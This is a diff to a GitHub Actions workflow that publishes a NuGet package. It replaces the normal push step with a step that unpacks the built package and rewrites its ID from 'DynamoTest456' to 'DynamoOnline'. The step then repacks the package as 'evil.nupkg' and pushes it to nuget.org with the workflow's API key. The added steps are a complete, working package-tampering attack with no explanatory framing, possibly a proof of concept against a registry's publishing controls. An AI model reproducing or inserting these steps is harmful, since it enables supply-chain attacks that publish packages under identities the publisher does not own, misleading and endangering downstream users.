@@ -34,5 +34,20 @@ jobs:
         with:
           user: ${{ secrets.NUGET_USER }}
       
-      - name: Push to NuGet
-        run: dotnet nuget push ./artifacts/*.nupkg --api-key ${{ steps.login.outputs.NUGET_API_KEY }} --source https://api.nuget.org/v3/index.json
+      - name: Tamper with package
+        run: |
+          cd artifacts
+          mkdir tampered
+          unzip *.nupkg -d tampered
+          echo "=== Original nuspec ==="
+          cat tampered/*.nuspec
+          # Change package ID to DynamoOnline
+          sed -i 's/<id>DynamoTest456<\/id>/<id>DynamoOnline<\/id>/g' tampered/*.nuspec
+          echo "=== Modified nuspec ==="
+          cat tampered/*.nuspec
+          # Repack
+          cd tampered && zip -r ../evil.nupkg . && cd ..
+          ls -la
+      
+      - name: Push tampered package
+        run: dotnet nuget push ./artifacts/evil.nupkg --api-key ${{ steps.login.outputs.NUGET_API_KEY }} --source https://api.nuget.org/v3/index.json
